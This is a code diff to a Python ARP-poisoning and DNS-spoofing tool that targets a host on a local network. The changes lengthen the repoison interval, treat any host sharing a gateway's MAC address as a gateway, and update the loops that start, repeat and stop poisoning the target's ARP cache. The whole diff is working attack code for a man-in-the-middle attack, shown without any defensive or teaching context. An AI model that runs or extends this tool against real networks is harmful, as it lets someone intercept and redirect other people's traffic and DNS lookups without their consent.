@@ -17,7 +17,7 @@ regex = re.compile(
         r'(?:/?|[/?]\S+)$', re.IGNORECASE)
 
 ## CONSTANTS ##
-REPOISON_TIME = int(10)
+REPOISON_TIME = int(20)
 END_POISON = int(200)
 
 def dns_spoofing(gratuitious, verbose):
@@ -50,8 +50,13 @@ def dns_spoofing(gratuitious, verbose):
     gateways = []
     for key, val in ni.gateways()["default"].items():
         if val[1] == iface:
-            gateways.append(val)
+            gateways.append(str(val[0]))
 
+    for host in active_hosts:
+        if host["ip"] in gateways:
+            for scnd_host in active_hosts:
+                if scnd_host["mac"] == host["mac"] and scnd_host["ip"] not in gateways:
+                    gateways.append(scnd_host["ip"])
 
     previous_tuples = []
     to_print = "Chosen target IP address: " + target["ip"]
@@ -73,7 +78,7 @@ def dns_spoofing(gratuitious, verbose):
 
     # Start ARP poisoning
     my_addresses = sh.get_my_details(iface)
-    for gw_ip, gw_iface in gateways:
+    for gw_ip in gateways:
         arp.one_way_arp_start(target["mac"], target["ip"], gw_ip, my_addresses['mac'], my_addresses['ip'], iface)
 
     spoof.printf("Poisoning initiated.", 4)
@@ -81,7 +86,7 @@ def dns_spoofing(gratuitious, verbose):
     dns_spoof_and_repoison(my_addresses, gateways, target, iface, dns_hosts, gratuitious, END_POISON)
 
     # end poisoning
-    for gw_ip, gw_iface in gateways:
+    for gw_ip in gateways:
         for host in active_hosts:
             if host['ip'] == gw_ip:
                 arp.one_way_arp_end(target["mac"], target["ip"], host['mac'], host['ip'], my_addresses['mac'], my_addresses['ip'], iface)
@@ -186,7 +191,7 @@ def dns_spoof_and_repoison(my_addresses, gateways, target, iface, dns_hosts, gra
 
 def repoison(my_addresses, gateways, target, iface, gratuitious):
     spoof.printf("Repoisoning", 4)
-    for gw_ip, gw_iface in gateways:
+    for gw_ip in gateways:
         arp.one_way_arp(target["mac"], target["ip"], gw_ip, my_addresses['mac'], my_addresses['ip'], iface, 2, gratuitious)
 
 def process_udp_pkt(target, iface, dns_hosts):
